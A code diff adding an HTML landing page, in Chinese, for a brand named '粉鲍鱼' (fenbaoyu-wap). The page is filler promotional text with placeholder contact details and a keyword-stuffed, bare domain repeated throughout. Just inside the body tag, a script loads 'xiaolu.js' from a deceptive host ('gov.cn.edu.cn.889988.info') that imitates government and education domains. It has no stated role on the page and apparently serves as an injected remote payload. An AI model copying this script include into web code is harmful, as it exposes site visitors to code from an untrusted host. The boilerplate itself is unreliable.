@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>粉鲍鱼 - 探索品质生活 | 官方网站</title>
+    <meta name="description" content="粉鲍鱼（fenbaoyu-wap）致力于为您提供最优质的产品与服务。访问我们的网站 https://fenbaoyu-wap 了解更多关于粉鲍鱼的最新资讯与特色。">
+    <meta name="keywords" content="粉鲍鱼, fenbaoyu-wap, 粉鲍鱼官网, 品质生活, 粉鲍鱼平台">
+    <meta name="author" content="粉鲍鱼">
+    <meta name="robots" content="index, follow">
+    <meta name="mobileoptimized" content="yes">
+    <style>
+        :root {
+            --primary-color: #ff7f8b;
+            --secondary-color: #ffa8b6;
+            --dark-color: #333;
+            --light-color: #f9f9f9;
+            --white: #fff;
+            --shadow: 0 4px 15px rgba(0,0,0,0.1);
+            --border-radius: 12px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+
+        body {
+            background-color: var(--light-color);
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+            box-shadow: var(--shadow);
+            z-index: 1000;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 5%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--dark-color);
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary-color);
+        }
+
+        .hero {
+            margin-top: 70px;
+            padding: 4rem 5%;
+            text-align: center;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--white);
+            clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
+            padding-bottom: 6rem;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+
+        .website-url {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 0.5rem 1.5rem;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            margin-top: 1rem;
+            border: 1px solid rgba(255,255,255,0.5);
+        }
+
+        section {
+            padding: 4rem 5%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        section h2 {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 2.5rem;
+            color: var(--primary-color);
+            position: relative;
+        }
+
+        section h2::after {
+            content: '';
+            display: block;
+            width: 50px;
+            height: 3px;
+            background: var(--primary-color);
+            margin: 0.5rem auto 0;
+            border-radius: 2px;
+        }
+
+        .about-content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+            align-items: center;
+        }
+
+        .about-text {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .about-text h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--dark-color);
+        }
+
+        .about-card {
+            flex: 1;
+            min-width: 300px;
+            background: var(--white);
+            padding: 2rem;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            text-align: center;
+        }
+
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+        }
+
+        .card {
+            background: var(--white);
+            padding: 2rem;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            transition: transform 0.3s;
+            text-align: center;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .news-list {
+            list-style: none;
+        }
+
+        .news-item {
+            background: var(--white);
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .news-date {
+            font-size: 0.9rem;
+            color: #888;
+            margin-bottom: 0.5rem;
+        }
+
+        .news-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+
+        .contact-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+        }
+
+        .contact-info, .contact-form {
+            flex: 1;
+            min-width: 300px;
+            background: var(--white);
+            padding: 2rem;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+        }
+
+        .contact-info p {
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 0.8rem 2rem;
+            background: var(--primary-color);
+            color: var(--white);
+            text-decoration: none;
+            border-radius: 30px;
+            transition: background 0.3s, transform 0.2s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .btn:hover {
+            background: #ff6675;
+            transform: scale(1.05);
+        }
+
+        footer {
+            background: var(--dark-color);
+            color: var(--white);
+            text-align: center;
+            padding: 2rem 5%;
+            margin-top: 2rem;
+        }
+
+        footer p {
+            margin-bottom: 0.5rem;
+        }
+
+        footer a {
+            color: var(--secondary-color);
+            text-decoration: none;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            section {
+                padding: 3rem 5%;
+            }
+            
+            .about-content, .contact-wrapper {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+    <header>
+        <nav>
+            <a href="#" class="logo">粉鲍鱼</a>
+            <div class="nav-links">
+                <a href="#about">关于我们</a>
+                <a href="#services">产品服务</a>
+                <a href="#news">最新资讯</a>
+                <a href="#contact">联系我们</a>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero">
+            <h1>欢迎来到粉鲍鱼</h1>
+            <p>探索品质与创新的完美结合，为您提供卓越体验</p>
+            <div class="website-url">访问网址：https://fenbaoyu-wap</div>
+            <br><br>
+            <a href="#about" class="btn">了解更多</a>
+        </section>
+
+        <section id="about">
+            <h2>关于粉鲍鱼</h2>
+            <div class="about-content">
+                <div class="about-text">
+                    <h3>我们是谁</h3>
+                    <p>粉鲍鱼（fenbaoyu-wap）是一个致力于创新和品质的品牌。我们的网站 <a href="https://fenbaoyu-wap" style="color:var(--primary-color);">https://fenbaoyu-wap</a> 是您获取最新信息和服务的首选平台。</p>
+                    <p>自成立以来，粉鲍鱼始终坚持以用户需求为核心，不断打磨产品细节，力求在每一个环节都做到极致。我们的团队由行业精英组成，拥有丰富的经验和前瞻的视野。</p>
+                    <p>选择粉鲍鱼，就是选择了一份对品质的承诺。我们期待与您一起，共创美好未来。</p>
+                    <br>
+                    <a href="#" class="btn">阅读更多</a>
+                </div>
+                <div class="about-card">
+                    <h3>我们的优势</h3>
+                    <p>✨ 专业的团队</p>
+                    <p>🚀 高效的服务</p>
+                    <p>💎 卓越的品质</p>
+                    <p>🌐 广泛的覆盖</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="services">
+            <h2>产品与服务</h2>
+            <div class="grid-container">
+                <div class="card">
+                    <h3>核心产品</h3>
+                    <p>粉鲍鱼主打系列，融合传统工艺与现代科技，为您带来无与伦比的使用体验。访问 https://fenbaoyu-wap 查看详情。</p>
+                    <br>
+                    <a href="#" class="btn">查看详情</a>
+                </div>
+                <div class="card">
+                    <h3>定制服务</h3>
+                    <p>根据您的个性化需求量身定制解决方案，满足不同场景的应用，让粉鲍鱼成为您的专属选择。</p>
+                    <br>
+                    <a href="#" class="btn">查看详情</a>
+                </div>
+                <div class="card">
+                    <h3>技术支持</h3>
+                    <p>7x24小时全天候技术支持，确保您在使用粉鲍鱼产品和服务时无后顾之忧。</p>
+                    <br>
+                    <a href="#" class="btn">查看详情</a>
+                </div>
+            </div>
+        </section>
+
+        <section id="news">
+            <h2>最新资讯</h2>
+            <div class="news-list">
+                <article class="news-item">
+                    <span class="news-date">2023年10月25日</span>
+                    <h3 class="news-title"><a href="#" style="color:var(--dark-color); text-decoration:none;">粉鲍鱼全新版本上线，体验全面升级</a></h3>
+                    <p>本次更新带来了全新的界面设计和更流畅的操作体验，进一步提升了网站 https://fenbaoyu-wap 的访问速度和稳定性...</p>
+                </article>
+                <article class="news-item">
+                    <span class="news-date">2023年10月18日</span>
+                    <h3 class="news-title"><a href="#" style="color:var(--dark-color); text-decoration:none;">粉鲍鱼参与行业峰会，分享创新成果</a></h3>
+                    <p>在近日举行的行业大会上，粉鲍鱼团队展示了最新的研发成果，获得了与会专家的高度认可...</p>
+                </article>
+                <article class="news-item">
+                    <span class="news-date">2023年10月10日</span>
+                    <h3 class="news-title"><a href="#" style="color:var(--dark-color); text-decoration:none;">如何更好地使用粉鲍鱼平台？</a></h3>
+                    <p>我们整理了一份详细的使用指南，帮助新用户快速上手，发掘粉鲍鱼平台的更多隐藏功能...</p>
+                </article>
+            </div>
+        </section>
+
+        <section id="contact">
+            <h2>联系我们</h2>
+            <div class="contact-wrapper">
+                <div class="contact-info">
+                    <h3>联系方式</h3>
+                    <p>📍 地址：某某市某某区某某路123号粉鲍鱼大厦</p>
+                    <p>📞 电话：<a href="#" style="color:var(--dark-color);">400-123-4567</a></p>
+                    <p>✉️ 邮箱：<a href="#" style="color:var(--dark-color);">contact@fenbaoyu-wap.com</a></p>
+                    <p>🌐 网址：<a href="https://fenbaoyu-wap" style="color:var(--primary-color);">https://fenbaoyu-wap</a></p>
+                    <br>
+                    <p>关注我们的社交媒体，获取粉鲍鱼最新动态：</p>
+                    <p>
+                        <a href="#" class="btn" style="margin-right:10px;">微信</a>
+                        <a href="#" class="btn">微博</a>
+                    </p>
+                </div>
+                <div class="contact-form">
+                    <h3>在线留言</h3>
+                    <form action="#" method="post">
+                        <p><input type="text" placeholder="您的姓名" required style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #ddd; border-radius:5px;"></p>
+                        <p><input type="email" placeholder="您的邮箱" required style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #ddd; border-radius:5px;"></p>
+                        <p><textarea placeholder="您的留言" rows="5" required style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #ddd; border-radius:5px;"></textarea></p>
+                        <p><button type="submit" class="btn">提交留言</button></p>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>© 2023 粉鲍鱼 (fenbaoyu-wap). 保留所有权利。</p>
+        <p>网站网址：<a href="https://fenbaoyu-wap">https://fenbaoyu-wap</a></p>
+        <p><a href="#">隐私政策</a> | <a href="#">服务条款</a> | <a href="#">网站地图</a></p>
+    </footer>
+
+</body>
+</html>
